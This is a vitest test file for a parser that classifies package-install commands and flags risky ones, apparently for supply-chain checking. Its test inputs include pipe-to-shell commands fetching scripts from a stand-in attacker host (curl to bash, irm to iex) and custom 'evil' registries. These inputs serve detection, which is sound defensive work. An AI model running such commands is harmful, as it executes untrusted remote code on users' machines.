import { describe, expect, it } from "vitest";
import { parseInstallCommand, splitCommands } from "../src/install/parse-command";

const pkgs = (cmd: string) =>
  parseInstallCommand(cmd)
    .filter((i) => i.kind === "package")
    .map((i) => (i.kind === "package" ? `${i.ecosystem}:${i.name}${i.spec ? `@${i.spec}` : ""}${i.executes ? "!" : ""}` : ""));

describe("splitCommands", () => {
  it("splits on operators and keeps quotes", () => {
    const c = splitCommands(`cd app && npm i "left pad" ; echo 'a && b' | grep a`);
    expect(c.map((x) => x.words)).toEqual([["cd", "app"], ["npm", "i", "left pad"], ["echo", "a && b"], ["grep", "a"]]);
    expect(c[2]!.pipedTo).toEqual(["grep", "a"]);
  });
});

describe("parseInstallCommand: npm family", () => {
  it("handles install verbs, flags and specs", () => {
    expect(pkgs("npm install polymarket-bot")).toEqual(["npm:polymarket-bot"]);
    expect(pkgs("npm i -D typescript @types/node@20 --save-exact")).toEqual(["npm:typescript", "npm:@types/node@20"]);
    expect(pkgs("pnpm add ethers@^6 viem")).toEqual(["npm:ethers@^6", "npm:viem"]);
    expect(pkgs("yarn add axios@1.14.1")).toEqual(["npm:axios@1.14.1"]);
    expect(pkgs("bun add @polymarket/clob-client")).toEqual(["npm:@polymarket/clob-client"]);
    expect(pkgs("sudo npm install -g some-cli")).toEqual(["npm:some-cli"]);
    expect(pkgs("FOO=1 npm i --registry https://registry.npmjs.org left-pad")).toEqual(["npm:left-pad"]);
  });

  it("marks executed packages", () => {
    expect(pkgs("npx -y create-polymarket-bot my-bot")).toEqual(["npm:create-polymarket-bot!"]);
    expect(pkgs("pnpm dlx shady-tool --flag")).toEqual(["npm:shady-tool!"]);
    expect(pkgs("bunx cowsay hi")).toEqual(["npm:cowsay!"]);
    expect(pkgs("npm exec --package=evil-pkg -- evil")).toEqual(["npm:evil-pkg!"]);
    expect(pkgs("npm create vite@latest my-app")).toEqual(["npm:create-vite!"]);
    expect(pkgs("npm init @sveltejs")).toEqual(["npm:@sveltejs/create!"]);
  });

  it("resolves aliases and git/url specs", () => {
    expect(pkgs("npm i lodash@npm:lodash-es@4")).toEqual(["npm:lodash-es@4"]);
    const repo = parseInstallCommand("npm install github:evil/bot");
    expect(repo[0]).toMatchObject({ kind: "repo", owner: "evil", repo: "bot" });
    expect(parseInstallCommand("npm i https://evil.example/pkg.tgz")[0]).toMatchObject({ kind: "remote-archive" });
    expect(parseInstallCommand("npm i ./local-dir ../other")).toEqual([]);
  });

  it("treats bare installs as manifest checks", () => {
    expect(parseInstallCommand("npm install")[0]).toMatchObject({ kind: "manifest", ecosystem: "npm" });
    expect(parseInstallCommand("npm ci")[0]).toMatchObject({ kind: "manifest" });
    expect(parseInstallCommand("yarn")[0]).toMatchObject({ kind: "manifest" });
    expect(parseInstallCommand("pnpm i --frozen-lockfile")[0]).toMatchObject({ kind: "manifest" });
  });

  it("flags custom registries", () => {
    expect(parseInstallCommand("npm i foo --registry=https://npm.evil.example").some((i) => i.kind === "custom-registry")).toBe(true);
  });

  it("ignores unrelated commands", () => {
    expect(parseInstallCommand("npm run build && npm test")).toEqual([]);
    expect(parseInstallCommand("git status; ls -la")).toEqual([]);
    expect(parseInstallCommand("echo npm install evil")).toEqual([]);
  });
});

describe("parseInstallCommand: python family", () => {
  it("handles pip and friends", () => {
    expect(pkgs("pip install py-clob-client")).toEqual(["pypi:py-clob-client"]);
    expect(pkgs("pip3 install -U 'requests>=2.31' web3==7.0.0")).toEqual(["pypi:requests@>=2.31", "pypi:web3@==7.0.0"]);
    expect(pkgs("python -m pip install --user ccxt")).toEqual(["pypi:ccxt"]);
    expect(pkgs("py -m pip install solana")).toEqual(["pypi:solana"]);
    expect(pkgs("uv pip install httpx")).toEqual(["pypi:httpx"]);
    expect(pkgs("uv add polymarket-apis")).toEqual(["pypi:polymarket-apis"]);
    expect(pkgs("poetry add hyperliquid-python-sdk")).toEqual(["pypi:hyperliquid-python-sdk"]);
    expect(pkgs("uvx shady-cli")).toEqual(["pypi:shady-cli!"]);
    expect(pkgs("pipx run cowsay")).toEqual(["pypi:cowsay!"]);
    expect(pkgs("pip install 'freqtrade[all]==2026.5.1'")).toEqual(["pypi:freqtrade@==2026.5.1"]);
  });

  it("handles requirements files, editable installs and indexes", () => {
    expect(parseInstallCommand("pip install -r requirements.txt")[0]).toMatchObject({ kind: "manifest", ecosystem: "pypi", file: "requirements.txt" });
    expect(parseInstallCommand("pip install -e .")).toEqual([]);
    expect(parseInstallCommand("pip install --extra-index-url https://pkgs.evil.example/simple foo").some((i) => i.kind === "custom-registry")).toBe(true);
    expect(parseInstallCommand("pip install git+https://github.com/evil/bot.git@main")[0]).toMatchObject({ kind: "repo", owner: "evil", repo: "bot", ref: "main" });
  });
});

describe("parseInstallCommand: repos and remote scripts", () => {
  it("handles git clone", () => {
    expect(parseInstallCommand("git clone https://github.com/someone/polymarket-bot.git")[0]).toMatchObject({ kind: "repo", owner: "someone", repo: "polymarket-bot" });
    expect(parseInstallCommand("git clone --depth 1 git@github.com:a/b.git")[0]).toMatchObject({ kind: "repo", owner: "a", repo: "b" });
    expect(parseInstallCommand("gh repo clone a/b")[0]).toMatchObject({ kind: "repo", owner: "a", repo: "b" });
  });

  it("handles curl | sh and iwr | iex", () => {
    expect(parseInstallCommand("curl -fsSL https://evil.example/i.sh | bash")[0]).toMatchObject({ kind: "pipe-to-shell", url: "https://evil.example/i.sh" });
    expect(parseInstallCommand("irm https://evil.example/x.ps1 | iex")[0]).toMatchObject({ kind: "pipe-to-shell" });
    expect(parseInstallCommand("curl -o x.sh https://example.com/x.sh")).toEqual([]);
  });
});
